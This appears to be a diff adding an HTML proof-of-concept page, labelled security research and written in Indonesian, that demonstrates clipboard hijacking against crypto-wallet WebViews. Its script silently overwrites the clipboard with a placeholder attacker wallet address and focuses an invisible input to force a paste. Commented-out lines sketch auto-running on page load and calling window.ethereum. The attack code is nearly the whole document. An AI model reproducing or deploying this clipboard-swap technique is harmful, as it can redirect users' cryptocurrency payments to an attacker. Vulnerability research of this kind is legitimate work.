@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Research - Auto-Execution PoC</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            padding: 20px;
+            text-align: center;
+            background-color: #f4f4f9;
+        }
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+        button {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 15px;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        .status {
+            margin-top: 15px;
+            font-weight: bold;
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>Security Sandbox</h2>
+    <p>Uji Coba Validasi Penanganan Clipboard & Otomasi Transaksi</p>
+    
+    <!-- Simulasi elemen tersembunyi untuk mencoba memicu auto-paste / auto-submit -->
+    <input type="text" id="hiddenInput" style="opacity: 0; position: absolute; pointer-events: none;" autofocus>
+    
+    <button onclick="triggerExploitPoC()">Jalankan Simulasi PoC</button>
+    
+    <div class="status" id="statusText">Status: Menunggu Aksi</div>
+</div>
+
+<script>
+    async function triggerExploitPoC() {
+        const statusEl = document.getElementById("statusText");
+        const maliciousAddress = "0xATTACKER_ADDRESS_SIMULATION_123456789";
+        
+        try {
+            // 1. Mengubah isi clipboard secara diam-diam menggunakan Clipboard API
+            if (navigator.clipboard && navigator.clipboard.writeText) {
+                await navigator.clipboard.writeText(maliciousAddress);
+                statusEl.innerText = "Status: Clipboard Berhasil Dimanipulasi!";
+            } else {
+                statusEl.innerText = "Status: Clipboard API tidak didukung.";
+                return;
+            }
+
+            // 2. Simulasi upaya pemaksaan auto-paste ke elemen input tersembunyi
+            setTimeout(() => {
+                const hiddenInput = document.getElementById("hiddenInput");
+                hiddenInput.focus();
+                
+                // Mencoba memicu perintah paste secara programmatic
+                document.execCommand('paste');
+                
+                statusEl.innerText = "Status: Mencoba Eksekusi Otomatis...";
+            }, 500);
+
+            // 3. Simulasi pemicuan event submit/sign otomatis jika WebView rentan terhadap DOM-based auto-trigger
+            setTimeout(() => {
+                // Contoh jika ada fungsi bridging native atau event form submit otomatis
+                // if (window.ethereum) { window.ethereum.request(...) }
+                statusEl.innerText = "Status: Selesai (Periksa Log Jaringan/Aplikasi)";
+            }, 1500);
+
+        } catch (err) {
+            statusEl.innerText = "Status Gagal: " + err.message;
+            console.error("Gagal mengeksekusi PoC:", err);
+        }
+    }
+
+    // Opsi tambahan: Memicu otomatis saat halaman dimuat (jika diizinkan izin autoplay/permissions WebView)
+    window.onload = function() {
+        // Opsional: triggerExploitPoC();
+    };
+</script>
+
+</body>
+</html>
